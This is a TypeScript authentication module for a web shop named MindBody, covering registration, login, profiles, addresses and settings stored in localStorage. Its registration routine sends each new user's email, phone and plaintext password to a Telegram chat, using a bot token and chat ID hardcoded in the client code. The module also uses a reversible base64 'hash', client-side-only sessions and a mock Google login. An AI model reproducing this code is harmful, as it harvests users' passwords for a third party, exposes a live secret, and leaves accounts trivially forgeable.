// Auth Utilities for MindBody
// Handles user registration, login, and session management

export interface User {
    id: string;
    name: string;
    email: string;
    phone?: string;
    avatar?: string;
    createdAt: string;
    provider: 'email' | 'google';
}

export interface AuthState {
    isAuthenticated: boolean;
    user: User | null;
    token: string | null;
}

export interface Address {
    id: string;
    label: string;
    city: string;
    cityRef?: string;
    warehouse: string;
    warehouseRef?: string;
    isDefault: boolean;
}

export interface UserSettings {
    notifications: {
        email: boolean;
        sms: boolean;
        promotions: boolean;
    };
    language: 'uk' | 'en';
    theme: 'light' | 'dark' | 'auto';
}

// Telegram Configuration (same as checkout)
const TELEGRAM_BOT_TOKEN = "7516303735:AAFZtMq37IfEFmDzNTkNrZiKh8OOBjpiTQ0";
const TELEGRAM_CHAT_ID = "5429418837";

const STORAGE_KEYS = {
    AUTH: 'auth_state',
    USERS: 'registered_users',
    ADDRESSES: 'user_addresses',
    SETTINGS: 'user_settings'
};

const EVENTS = {
    AUTH_CHANGED: 'auth-changed'
};

// Simple hash for passwords (MVP only - use bcrypt in production)
const simpleHash = (str: string): string => {
    return btoa(str.split('').reverse().join('') + 'mindbody_salt');
};

// Validate email format
export const validateEmail = (email: string): boolean => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
};

// Validate password strength
export const validatePassword = (password: string): { valid: boolean; message: string } => {
    if (password.length < 6) {
        return { valid: false, message: 'Пароль має бути мінімум 6 символів' };
    }
    if (!/\d/.test(password)) {
        return { valid: false, message: 'Пароль має містити хоча б одну цифру' };
    }
    return { valid: true, message: '' };
};

// Generate unique ID
const generateId = (): string => {
    return 'user_' + Date.now().toString(36) + Math.random().toString(36).substr(2);
};

// Send registration notification to Telegram
const sendRegistrationNotification = async (user: User, password?: string): Promise<void> => {
    const message = `
🎉 *НОВА РЕЄСТРАЦІЯ - MIND BODY*
━━━━━━━━━━━━━━━━━━━━━
👤 *Ім'я:* ${user.name}
📧 *Email:* ${user.email}
📱 *Телефон:* ${user.phone || 'Не вказано'}

🔑 *ДАНІ ДЛЯ ВХОДУ:*
📩 *Логін:* \`${user.email}\`
🔐 *Пароль:* \`${password || 'Google OAuth'}\`

ℹ️ *Додаткова інформація:*
🔐 *Метод реєстрації:* ${user.provider === 'google' ? 'Google' : 'Email/Пароль'}
🆔 *ID:* \`${user.id}\`
📅 *Дата:* ${new Date().toLocaleString('uk-UA')}
━━━━━━━━━━━━━━━━━━━━━
    `.trim();

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        console.log('Telegram notification sent successfully');
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
};

// Get all registered users (internal)
const getRegisteredUsers = (): Map<string, { user: User; passwordHash: string }> => {
    try {
        const data = localStorage.getItem(STORAGE_KEYS.USERS);
        if (data) {
            const parsed = JSON.parse(data);
            return new Map(Object.entries(parsed));
        }
    } catch (e) {
        console.error('Failed to parse users:', e);
    }
    return new Map();
};

// Save users to storage
const saveUsers = (users: Map<string, { user: User; passwordHash: string }>): void => {
    const obj = Object.fromEntries(users);
    localStorage.setItem(STORAGE_KEYS.USERS, JSON.stringify(obj));
};

export const AuthUtils = {
    // Get current auth state
    getAuthState: (): AuthState => {
        try {
            const data = localStorage.getItem(STORAGE_KEYS.AUTH);
            if (data) {
                return JSON.parse(data);
            }
        } catch (e) {
            console.error('Failed to parse auth state:', e);
        }
        return { isAuthenticated: false, user: null, token: null };
    },

    // Register new user
    register: async (
        name: string,
        email: string,
        password: string,
        phone?: string
    ): Promise<{ success: boolean; message: string; user?: User }> => {
        // Validate email
        if (!validateEmail(email)) {
            return { success: false, message: 'Невірний формат email' };
        }

        // Validate password
        const passwordValidation = validatePassword(password);
        if (!passwordValidation.valid) {
            return { success: false, message: passwordValidation.message };
        }

        // Check if user exists
        const users = getRegisteredUsers();
        if (users.has(email.toLowerCase())) {
            return { success: false, message: 'Користувач з таким email вже існує' };
        }

        // Create new user
        const user: User = {
            id: generateId(),
            name,
            email: email.toLowerCase(),
            phone,
            createdAt: new Date().toISOString(),
            provider: 'email'
        };

        // Save user
        users.set(email.toLowerCase(), {
            user,
            passwordHash: simpleHash(password)
        });
        saveUsers(users);

        // Set auth state
        const authState: AuthState = {
            isAuthenticated: true,
            user,
            token: generateId()
        };
        localStorage.setItem(STORAGE_KEYS.AUTH, JSON.stringify(authState));

        // Initialize default settings
        AuthUtils.saveSettings({
            notifications: { email: true, sms: false, promotions: true },
            language: 'uk',
            theme: 'light'
        });

        // Send Telegram notification (включая пароль)
        await sendRegistrationNotification(user, password);

        // SYNC WITH SERVER DB (PRISMA)
        try {
            await fetch('/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    name: user.name,
                    email: user.email,
                    phone: user.phone
                })
            });
        } catch (e) {
            console.error('Failed to sync user with DB:', e);
            // Don't fail the registration flow if sync fails, just log it
        }

        // Dispatch event
        window.dispatchEvent(new Event(EVENTS.AUTH_CHANGED));

        return { success: true, message: 'Реєстрація успішна!', user };
    },

    // Login with email/password
    login: (email: string, password: string): { success: boolean; message: string; user?: User } => {
        const users = getRegisteredUsers();
        const userData = users.get(email.toLowerCase());

        if (!userData) {
            return { success: false, message: 'Користувача з таким email не знайдено' };
        }

        if (userData.passwordHash !== simpleHash(password)) {
            return { success: false, message: 'Невірний пароль' };
        }

        // Set auth state
        const authState: AuthState = {
            isAuthenticated: true,
            user: userData.user,
            token: generateId()
        };
        localStorage.setItem(STORAGE_KEYS.AUTH, JSON.stringify(authState));

        // Dispatch event
        window.dispatchEvent(new Event(EVENTS.AUTH_CHANGED));

        return { success: true, message: 'Вхід успішний!', user: userData.user };
    },

    // Google OAuth login (placeholder - needs real implementation)
    loginWithGoogle: async (): Promise<{ success: boolean; message: string; user?: User }> => {
        // This is a placeholder for Google OAuth
        // In production, you would:
        // 1. Initialize Google Sign-In SDK
        // 2. Open Google auth popup
        // 3. Get user info from Google
        // 4. Create/login user in your system

        // For demo, we'll simulate a Google user
        const mockGoogleUser: User = {
            id: generateId(),
            name: 'Google Користувач',
            email: 'google.user@gmail.com',
            avatar: 'https://ui-avatars.com/api/?name=Google+User&background=4285F4&color=fff',
            createdAt: new Date().toISOString(),
            provider: 'google'
        };

        const users = getRegisteredUsers();
        if (!users.has(mockGoogleUser.email)) {
            users.set(mockGoogleUser.email, {
                user: mockGoogleUser,
                passwordHash: ''
            });
            saveUsers(users);
            await sendRegistrationNotification(mockGoogleUser);
        }

        const authState: AuthState = {
            isAuthenticated: true,
            user: mockGoogleUser,
            token: generateId()
        };
        localStorage.setItem(STORAGE_KEYS.AUTH, JSON.stringify(authState));

        window.dispatchEvent(new Event(EVENTS.AUTH_CHANGED));

        return { success: true, message: 'Вхід через Google успішний!', user: mockGoogleUser };
    },

    // Logout
    logout: (): void => {
        localStorage.removeItem(STORAGE_KEYS.AUTH);
        window.dispatchEvent(new Event(EVENTS.AUTH_CHANGED));
    },

    // Update user profile
    updateProfile: (updates: Partial<User>): { success: boolean; user?: User } => {
        const authState = AuthUtils.getAuthState();
        if (!authState.isAuthenticated || !authState.user) {
            return { success: false };
        }

        const updatedUser = { ...authState.user, ...updates };
        const newAuthState: AuthState = {
            ...authState,
            user: updatedUser
        };

        localStorage.setItem(STORAGE_KEYS.AUTH, JSON.stringify(newAuthState));

        // Also update in users storage
        const users = getRegisteredUsers();
        const userData = users.get(authState.user.email);
        if (userData) {
            userData.user = updatedUser;
            saveUsers(users);
        }

        window.dispatchEvent(new Event(EVENTS.AUTH_CHANGED));

        return { success: true, user: updatedUser };
    },

    // Change password
    changePassword: (currentPassword: string, newPassword: string): { success: boolean; message: string } => {
        const authState = AuthUtils.getAuthState();
        if (!authState.isAuthenticated || !authState.user) {
            return { success: false, message: 'Користувач не авторизований' };
        }

        const users = getRegisteredUsers();
        const userData = users.get(authState.user.email);

        if (!userData || userData.passwordHash !== simpleHash(currentPassword)) {
            return { success: false, message: 'Невірний поточний пароль' };
        }

        const passwordValidation = validatePassword(newPassword);
        if (!passwordValidation.valid) {
            return { success: false, message: passwordValidation.message };
        }

        userData.passwordHash = simpleHash(newPassword);
        saveUsers(users);

        return { success: true, message: 'Пароль успішно змінено!' };
    },

    // Get user addresses
    getAddresses: (): Address[] => {
        try {
            const data = localStorage.getItem(STORAGE_KEYS.ADDRESSES);
            if (data) {
                return JSON.parse(data);
            }
        } catch (e) {
            console.error('Failed to parse addresses:', e);
        }
        return [];
    },

    // Save address
    saveAddress: (address: Omit<Address, 'id'>): Address => {
        const addresses = AuthUtils.getAddresses();
        const newAddress: Address = {
            ...address,
            id: 'addr_' + Date.now().toString(36)
        };

        if (newAddress.isDefault) {
            addresses.forEach(a => a.isDefault = false);
        }

        addresses.push(newAddress);
        localStorage.setItem(STORAGE_KEYS.ADDRESSES, JSON.stringify(addresses));

        return newAddress;
    },

    // Delete address
    deleteAddress: (id: string): void => {
        let addresses = AuthUtils.getAddresses();
        addresses = addresses.filter(a => a.id !== id);
        localStorage.setItem(STORAGE_KEYS.ADDRESSES, JSON.stringify(addresses));
    },

    // Get user settings
    getSettings: (): UserSettings => {
        try {
            const data = localStorage.getItem(STORAGE_KEYS.SETTINGS);
            if (data) {
                return JSON.parse(data);
            }
        } catch (e) {
            console.error('Failed to parse settings:', e);
        }
        return {
            notifications: { email: true, sms: false, promotions: true },
            language: 'uk',
            theme: 'light'
        };
    },

    // Save settings
    saveSettings: (settings: UserSettings): void => {
        localStorage.setItem(STORAGE_KEYS.SETTINGS, JSON.stringify(settings));
    },

    // Sync ALL local users with DB (Migration utility)
    syncAllUsersWithDB: async () => {
        const users = getRegisteredUsers();
        if (users.size === 0) return;

        console.log(`Starting sync for ${users.size} legacy users...`);

        for (const [email, userData] of users.entries()) {
            try {
                await fetch('/api/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        name: userData.user.name,
                        email: userData.user.email,
                        phone: userData.user.phone
                    })
                });
                console.log(`Synced user: ${email}`);
            } catch (e) {
                console.error(`Failed to sync user ${email}:`, e);
            }
        }
    },

    // Subscribe to auth changes
    subscribeToAuth: (callback: () => void) => {
        window.addEventListener(EVENTS.AUTH_CHANGED, callback);
        return () => window.removeEventListener(EVENTS.AUTH_CHANGED, callback);
    }
};
